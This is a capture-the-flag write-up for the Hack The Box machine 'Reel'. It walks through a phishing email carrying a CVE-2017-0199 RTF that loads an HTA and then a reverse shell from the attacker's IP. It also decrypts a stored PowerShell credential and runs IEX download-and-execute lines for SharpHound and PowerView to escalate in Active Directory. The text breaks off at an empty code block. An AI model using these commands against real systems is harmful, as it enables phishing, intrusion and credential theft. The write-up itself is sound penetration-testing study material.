# Reel

This is the write-up for the box Reel that got retired at the 10th November 2018.
My IP address was 10.10.14.23 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.77    reel.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/reel.nmap 10.10.10.77
```

We get following results:
```markdown
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.80%I=7%D=9/28%Time=5D8F5C45%P=x86_64-pc-linux-gnu%r(NULL
(...)
```

## Checking FTP (Port 21)

The first thing we do is to check the FTP service because anonymous login is allowed. After login in with user _anonymous_ we find three files in the _documents_ folder.
```markdown
ftp 10.10.10.77

mget *
```

- AppLocker.docx
- Windows Event Forwarding.docx
- readme.txt

**AppLocker.docx** says:
> AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.

**Readme.txt** says:
> please email me any rtf format procedures - I'll review and convert.
new format / converted documents will be saved here

## Checking SMTP (Port 25)

The _readme.txt_ and the fact that SMTP is open tells us that we need to send a phishing mail with an attached RTF (Rich-Text-Format) file to someone but we don't know who yet.
If we check the metadata of the .docx files we get an interesting information on the _Windows Event Forwarding.docx_ file:
```markdown
exiftool Windows Event Forwarding.docx
```
```markdown
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
```

We will check if this email address is valid with telnet before we send any mails to him.
```markdown
telnet 10.10.10.77.25


220 Mail Service ready
HELO testdomain.com
250 Hello.
MAIL FROM: <test@test.com> 
250 OK
RCPT TO: <nico@megabank.com>
250 OK
```

As it says _250 OK_ the mail server does know this email address and we can proceed but we can't execute anything that was described in the _AppLocker.docx_ file.

### Creating the malicious attachment

To generate a malicious RTF file we will use [this exploit toolkit](https://github.com/bhdresh/CVE-2017-0199):
```markdown
python cve-2017-0199_toolkit.py -M gen -w payload.rtf -u 'http://10.10.14.23/link.hta' -t RTF -x 0
```

We got the malicious RTF file _payload.rtf_ and now we need a HTA file that we will generate with **Nishang** with the script **Out-HTA.ps1**.
As this is a Powershell script we either need to start a Powershell command line on our machine or do this with a Windows machine.
I will use **pwsh** that can be installed from Microsofts repository for Linux.

```markdown
Out-HTA -PayloadURL http://10.10.14.23/shell.ps1
```

This creates the file **WindDef_WebInstall.hta** that I will call **link.hta** so I can type it faster.
For our reverse shell we will use the script **Invoke-PowerShellTcp.ps1** from **Nishang** that I call **shell.ps1**.

To summarize what we got now:
- payload.rtf
  - This will be sent to the user and contains a link to the HTA file **link.hta**
- link.hta
  - This will redirect the user to execute the reverse shell **shell.ps1**
- shell.ps1
  - This is the reverse shell that listens on my machines IP and port 9001

Now we can send the email:
```markdown
sendemail -f test@megabank.com -t nico@megabank.com -u RTF -m "Please look at this file" -a payload.rtf -s 10.10.10.77
```

After some seconds the HTA file will be downloaded, inspected by the user, and start a reverse shell on the box!

## Privilege Escalation 1

We are now on the box as the user **htb\nico**. Interestingly enough this is not a local user but a domain user.

Looking at the AppLocker policy if you are interested in that:
```powershell
Get-ApplockerPolicy -Effective -xml
```

In the desktop directory of _nico_ is another file other than user.txt that looks interesting. It is called *cred.xml** and this is the contents:
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

This has a **secure string** from the user **HTB\Tom** in there that we will decrypt:
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | ConvertTo-SecureString
$user = "HTB\Tom"
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl
```

We get the password of _Tom_:
> 1ts-mag1c!!!

As we know that there is SSH running on this machine we can use that service to login with Tom.

## Privilege Escalation 2

Looking through _Tom_ desktop folder we find the folder **AD Audit** with a file **note.txt** that says:
```markdown
Findings:                                                                                                                       
Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  
Maybe we should re-run Cypher query against other groups we've created.
```

And another folder in there named **BloodHound** that we will use to analyze the AD domains user structure.

As we will upload different files from the box to our client we will use **impacket-smbserver** so we have a place for the box to upload files:
```markdown
On local client: impacket-smbserver share `pwd`

On reel: net use Z: \\10.10.14.23\share
```

The Bloodhound Ingestors on the box won't start because of AppLocker thats why I upload **SharpHound.ps1** from my client to the box:
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23/SharpHound.ps1')

Invoke-Bloodhound
```

This function in SharpHound will collect the information that we can ingest in BloodHound on our machine.
Before starting BloodHound we need to start the **neo4j** database first:
```markdown
neo4j console

Browse to: http://localhost:7474/
Default password: neo4j
Enter new password
```

After that we can start Bloodhound and login with the credentials we entered and we are in. Now we can drag the .zip file we generated with SharpHound into it.

### Analyzing BloodHound

We can see that _Tom_ and _Nico_ are group members of **Print Operators** and this group has a path to _Administrator_:

![Shortest Paths to High Value Targets](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_1.png)

This is no direct path, so we need to look for groups we care about and that BloodHound just doesn't know. If we look at the groups of the users we have manually, we see the group **Backup_Admins** that we need to query in BloodHound.
```markdown
net groups /domain
```

If we execute the function in SharpHound with the parameters that it should collect all information, we get more results to analyze:
```powershell
Invoke-Bloodhound -CollectionMethod All
```

Now the same query as last time has a lot more information:
![Shortest Paths to High Value Targets with CollectionMethod All](https://kyuu-ji.github.io/htb-write-up/reel/Image2.png)

If we query for a path from **NICO@HTB.LOCAL** to **BACKUP_ADMINS@HTB.LOCAL** we get see that Nico has _WriteOwner_ permissions **to Herman@htb.local** who has _GenericWrite_ and _WriteDacl_ to the Backup_Admins group:
![Nico to Backup_Admins group](https://kyuu-ji.github.io/htb-write-up/reel/Image3.png)

All Active Directory privileges are explained on [ADSecurity.org](https://adsecurity.org/?p=3658).

- WriteOwner: Provides the ability to take ownership of an object. The owner of an object can gain full control rights on the object
- GenericWrite: Provides write access to all properties
- WriteDACL: Provides the ability to modify security on an object which can lead to Full Control of the object

This means we can take ownership with Nico of the Herman account and change his password for example and with that user we can take full control over the Backup_Admins group.

### Exploiting Active Directory

To exploit that permissions in AD we start the script **PoverView.ps1** from the **PowerSploit** script collection framework which you can find in Tom desktop folder, but I am going to upload it from my local machine.
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23/PowerView.ps1')
```

Taking ownership of Herman:
```powershell

```
